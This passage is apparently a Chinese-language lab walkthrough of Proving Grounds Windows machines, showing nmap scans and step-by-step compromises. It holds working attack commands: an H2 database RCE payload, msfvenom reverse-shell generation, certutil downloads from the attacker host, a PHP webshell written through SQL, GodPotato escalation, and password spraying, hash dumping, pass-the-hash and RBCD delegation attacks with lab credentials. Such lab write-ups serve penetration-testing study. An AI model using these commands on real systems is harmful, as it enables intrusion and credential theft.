SF:0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20
SF:\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x2
SF:0\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\
SF:0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x0
SF:09\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\
SF:0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\
SF:0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0
SF:\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0
SF:\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0
SF:n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0
SF:b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r\
SF:0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0
SF:D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\0
SF:t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x2
SF:0\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=3/7%OT=80%CT=1%CU=32453%PV=Y%DS=4%DC=T%G=Y%TM=67CA53F5
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=10
OS:4%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=109%TI=I%CI=I%TS=U)S
OS:EQ(SP=105%GCD=3%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=2%ISR=10A%TI=I%CI=
OS:I%TS=U)OPS(O1=M56ENW8NNS%O2=M56ENW8NNS%O3=M56ENW8%O4=M56ENW8NNS%O5=M56EN
OS:W8NNS%O6=M56ENNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M56ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-07T02:03:18
|_  start_date: N/A

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   238.19 ms 192.168.45.1
2   238.16 ms 192.168.45.254
3   238.49 ms 192.168.251.1
4   238.57 ms 192.168.138.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1138.56 seconds
```

80端口开放`H2 Database Engine`服务

![image-20250307094816386](./PG_win.assets/image-20250307094816386.png)

8082端口是h2的后台

![image-20250307101436490](./PG_win.assets/image-20250307101436490.png)

按照网上相关复现文章，空口令可直接登录系统

![image-20250307101534505](./PG_win.assets/image-20250307101534505.png)

后台得到系统版本号为` H2 1.4.199 `，按照exp执行sql语句(太长了不全粘了)：https://www.exploit-db.com/exploits/49384

```
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90)。。。。。。。CHAR(0x00),CHAR(0x00),CHAR(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');
```

成功执行whoami

![image-20250307102100854](./PG_win.assets/image-20250307102100854.png)

直接利用powershell+base64反弹shell失败，使用msf生成反弹exe

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.161 LPORT=80 -f exe > rev.exe
```

传输到靶机

```
certutil -split -urlcache -f http://192.168.45.161:90/rev.exe C:\\Windows\\Temp\\rev.exe #执行的命令
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -split -urlcache -f http://192.168.45.161:90/rev.exe C:\\Windows\\Temp\\rev.exe").getInputStream()).useDelimiter("\\Z").next()');  #实际执行的sql语句
```

执行rev.exe成功反弹shell

```
C:\\Windows\\Temp\\rev.exe   #执行的命令
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\Temp\\rev.exe").getInputStream()).useDelimiter("\\Z").next()');   #实际执行的sql语句
```

![image-20250307102856808](./PG_win.assets/image-20250307102856808.png)

拿到local

![image-20250307103101019](./PG_win.assets/image-20250307103101019.png)

查看用户权限，发现开启SeImpersonatePrivilege，可以使用土豆提权

![image-20250307134944944](./PG_win.assets/image-20250307134944944.png)

切换目录后发现很多命令无法使用，修复环境变量后可以使用powershell

```
set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
```

上传土豆（试了很多最后GodPotato-NET4.exe可以

```
certutil -split -urlcache -f http://192.168.45.161:90/potato/GodPotato-NET4.exe C:\\Users\\tony\\GodPotato.exe
```

使用GodPotato成功提权，拿到proof

```
.\GodPotato.exe -cmd "cmd /c type \Users\Administrator\Desktop\proof.txt"
```

![image-20250307135132475](./PG_win.assets/image-20250307135132475.png)

## Kevin

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.118.45
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-08 10:01 CST
Nmap scan report for 192.168.118.45
Host is up (0.0030s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.118.45/index.asp
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2025-03-08T02:03:00+00:00; 0s from scanner time.
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/8%OT=80%CT=1%CU=40140%PV=Y%DS=4%DC=T%G=Y%TM=67CBA590
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=7)OPS(O1=M5
OS:4ENW8ST11%O2=M54ENW8ST11%O3=M54ENW8NNT11%O4=M54ENW8ST11%O5=M54ENW8ST11%O
OS:6=M54EST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%D
OS:F=Y%T=80%W=2000%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G
OS:%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:b7:21 (VMware)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-08T02:02:45
|_  start_date: 2025-03-08T02:00:29

TRACEROUTE (using port 1025/tcp)
HOP RTT     ADDRESS
1   2.89 ms 192.168.45.1
2   2.89 ms 192.168.45.254
3   2.98 ms 192.168.251.1
4   3.23 ms 192.168.118.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.73 seconds
```

开放了80http服务，服务名为`HP Power Manager `

![image-20250307194908220](./PG_win.assets/image-20250307194908220.png)

网上找了个脚本利用比较困难，改了好久都没打通，最后还是用了msf的模块（`windows/http/hp_power_manager_filename`）打

![image-20250308102530276](./PG_win.assets/image-20250308102530276.png)

如果第一次没收到session就重置环境再打，循环几遍就拿到shell了，直接是system权限

![image-20250308105229251](./PG_win.assets/image-20250308105229251.png)

拿到proof

![image-20250308105400290](./PG_win.assets/image-20250308105400290.png)

## Resourced

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.118.175
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-08 10:56 CST
Nmap scan report for 192.168.118.175
Host is up (0.0028s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-08 02:58:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-08T03:00:35+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-03-07T02:56:08
|_Not valid after:  2025-09-06T02:56:08
|_ssl-date: 2025-03-08T03:01:14+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/8%Time=67CBB24C%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-08T03:00:35
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT     ADDRESS
1   2.48 ms 192.168.45.1
2   2.36 ms 192.168.45.254
3   2.84 ms 192.168.251.1
4   2.88 ms 192.168.118.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 365.79 seconds
```

首先尝试验证是否存在dns隧道传输

```
dig axfr @192.168.118.175 resourced.local
```

![image-20250308111045177](./PG_win.assets/image-20250308111045177.png)

没发现敏感信息，使用ldapsearch进一步收集

```
ldapsearch -x -b "dc=resourced,dc=local" -H ldap://192.168.118.175
```

![image-20250308113244151](./PG_win.assets/image-20250308113244151.png)

又尝试了smbclient失败，使用rpcclient收集用户名

```
rpcclient -U "" -N 192.168.118.175
rpcclient $> enumdomusers
```

![image-20250308114550709](./PG_win.assets/image-20250308114550709.png)

查看有没有泄露的hash

```
impacket-GetNPUsers resourced.local/ -dc-ip 192.168.118.175 -no-pass -usersfile '/home/cyborg/oscp/pg/win/Resourced/users.txt'
```

![image-20250308125300529](./PG_win.assets/image-20250308125300529.png)

未果，使用enum4linux针对smb收集发现一个疑似用户凭证的：HotelCalifornia194!

```
enum4linux 192.168.118.175
```

![image-20250308125116443](./PG_win.assets/image-20250308125116443.png)

使用crackmapexec对已知密码进行密码喷洒

```
crackmapexec smb 192.168.118.175 -u ./users.txt -p 'HotelCalifornia194!'
```

![image-20250308125547364](./PG_win.assets/image-20250308125547364.png)

只有用户`V.Ventz`使用该密码，尝试使用evil-winrm登录

```
evil-winrm -i 192.168.118.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
```

![image-20250308125734688](./PG_win.assets/image-20250308125734688.png)

失败了，使用该账号查看smb信息

```
smbmap -H 192.168.118.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
```

![image-20250308125924240](./PG_win.assets/image-20250308125924240.png)

有一个文件看着很“危险”：`Password Audit`    （空格记得转义

```
smbclient //192.168.118.175/Password\ Audit -U 'V.Ventz'%'HotelCalifornia194!'
```

![image-20250308130158006](./PG_win.assets/image-20250308130158006.png)

全部下载到kali，给了ntds.dit和SYSTEM，之前在HTB做过相关题目，可以用secretsdump解密获取相关凭证

```
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

![image-20250308130638427](./PG_win.assets/image-20250308130638427.png)

成功拿到相关凭证，直接PTH管理员失败了

```
evil-winrm -i 192.168.118.175 -u Administrator -H aad3b435b51404eeaad3b435b51404ee
```

![image-20250308130835514](./PG_win.assets/image-20250308130835514.png)

使用在线网站解密明文hash：https://crackstation.net/

```
cat hash.txt | cut -d : -f 4 > hash1.txt
```

![image-20250308131445692](./PG_win.assets/image-20250308131445692.png)

根据对照，找到了administrator的凭证：administrator/ItachiUchiha888

但是使用evil-winrm和xfreerdp都失败了

使用crackmapexec批量探测有没有能登录evil-winrm的凭证

```
crackmapexec winrm 192.168.118.175 -u users.txt -H hash1.txt
```

![image-20250308132104109](./PG_win.assets/image-20250308132104109.png)

有一个可以登陆的凭证，PTH登录即可

```
evil-winrm -i 192.168.118.175 -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808
```

![image-20250308132214932](./PG_win.assets/image-20250308132214932.png)

拿到local

![image-20250308132844994](./PG_win.assets/image-20250308132844994.png)

使用bloodhound对域内进行信息收集

```
bloodhound-python -u 'L.Livingstone' --hashes 'aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808' -d resourced.local -ns 192.168.118.175 -c DcOnly
```

![image-20250308134346135](./PG_win.assets/image-20250308134346135.png)

左上角搜索用户右键标记为已拥有，选择功能：`从已拥有权限的用户到域管理员的最短路径`

![image-20250308134320406](./PG_win.assets/image-20250308134320406.png)

右键线路选择help就会给出这一步的步骤

![image-20250308134727740](./PG_win.assets/image-20250308134727740.png)

上传mimikatz，但是在evil-winrm不能直接使用，会死循环，带上exit

```
.\mimikatz.exe 'lsadump::dcsync /domain:resourced.local /user:Administrator' 'exit'
```

失败了，看了hints，利用的是**资源约束委派（RBCD）攻击**

~~首先上传Powermad.ps1，导入模块添加用户~~

换一种方法先添加用户：cyb0rg/123@Abc

```
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.118.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'cyb0rg$' -computer-pass '123@Abc'
```

![image-20250308154110510](./PG_win.assets/image-20250308154110510.png)

使用 getST.py 为 resourcedc 检索服务票证

```
impacket-rbcd -action write -delegate-to "RESOURCEDC$" -delegate-from "cyb0rg$" -dc-ip 192.168.118.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
```

![image-20250308154151526](./PG_win.assets/image-20250308154151526.png)

使用impacket-getST获取 RESOURCEDC 的服务票据，生成`Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache `文件

```
impacket-getST -spn cifs/resourcedc.resourced.local -impersonate Administrator resourced/cyb0rg\\$:'123@Abc' -dc-ip 192.168.118.175
```

![image-20250308154331872](./PG_win.assets/image-20250308154331872.png)

添加到环境变量

```
export KRB5CCNAME=$PWD/Administrator.ccache
```

使用klist查看本地票据

```
klist
apt update && apt install -y krb5-user   #如果没有安装
```

登录即可

```
impacket-psexec -dc-ip 192.168.118.175 -k -no-pass resourcedc.resourced.local
```



![image-20250308160351597](./PG_win.assets/image-20250308160351597.png)

拿到proof

![image-20250308160603765](./PG_win.assets/image-20250308160603765.png)

## Squid

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.118.189
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-08 16:12 CST
Nmap scan report for 192.168.118.189
Host is up (0.0039s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-08T08:15:08
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT     ADDRESS
1   3.54 ms 192.168.45.1
2   3.40 ms 192.168.45.254
3   3.67 ms 192.168.251.1
4   3.72 ms 192.168.118.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.12 seconds
```

先检查了一下445smb服务未果

```
smbclient -L //192.168.118.189 -N
```

然后检查了3128的http服务，确定版本信息squid 4.14

![image-20250308194252777](./PG_win.assets/image-20250308194252777.png)

没有找到相关的exp，使用spose探测端口

https://github.com/aancw/spose

```
python3 spose.py --proxy http://192.168.118.189:3128 --target 192.168.118.189
```

![image-20250309203503490](./PG_win.assets/image-20250309203503490.png)

可以利用代理访问3306和8080,8080是一个Wampserver可以跳转到phpmyadmin

![image-20250309203609362](./PG_win.assets/image-20250309203609362.png)

使用root+空密码成功登录后台（可以考虑用sql语句写马

![image-20250309204035469](./PG_win.assets/image-20250309204035469.png)

在phpinfo()页面DOCUMENT_ROOT字段找到`C:/wamp/www `网站绝对路径

![image-20250309203950218](./PG_win.assets/image-20250309203950218.png)

执行sql写入木马

```
select "<?php system($_REQUEST['shell']);" into outfile "C:/wamp/www/shell.php";
```

![image-20250309204241744](./PG_win.assets/image-20250309204241744.png)

成功RCE

![image-20250309204350239](./PG_win.assets/image-20250309204350239.png)

拿到proof

![image-20250309204446975](./PG_win.assets/image-20250309204446975.png)

但是发现这题有两个flag，在C盘根目录发现local

![image-20250309205014751](./PG_win.assets/image-20250309205014751.png)

拿到local

![image-20250309205238075](./PG_win.assets/image-20250309205238075.png)

## DVR4

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.220.179
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-09 20:56 CST
Nmap scan report for 192.168.118.179
Host is up (0.0026s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
|_http-title: Argus Surveillance DVR
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=3/9%Time=67CD9012%P=x86_64-pc-linux-gnu%r(Get
SF:Request,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\nKee
SF:p-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nConte
SF:nt-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Survei
SF:llance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type\"\x
SF:20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"GENE
SF:RATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pysoft\
SF:.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\x20b
SF:order=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"\x20
SF:frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasTop
SF:Frame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r\n\x
SF:20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrolling
SF:=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth=\"0
SF:\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\"\x2
SF:0frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"CamerasBo
SF:ttomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r
SF:\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20fram
SF:es,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r\n\x
SF:20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\nConn
SF:ection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nContent
SF:-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r
SF:\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20h
SF:ttp-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-8859-
SF:1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x206
SF:\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<framese
SF:t\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x
SF:20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20
SF:noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20margi
SF:nheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20fr
SF:ameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXIFram
SF:e\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame
SF:\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x2
SF:0noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\x20m
SF:arginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>
SF:This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn't\x2
SF:0support\x20them\.</p>\r\n\x20\x20</noframes>\r");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/9%OT=22%CT=1%CU=35190%PV=Y%DS=4%DC=T%G=Y%TM=67CD90CF
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=I%CI=I%TS=U)OPS(O1=M5
OS:4ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS
OS:)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W
OS:=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7
OS:(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-09T12:59:35
|_  start_date: N/A

TRACEROUTE (using port 1025/tcp)
HOP RTT     ADDRESS
1   2.68 ms 192.168.45.1
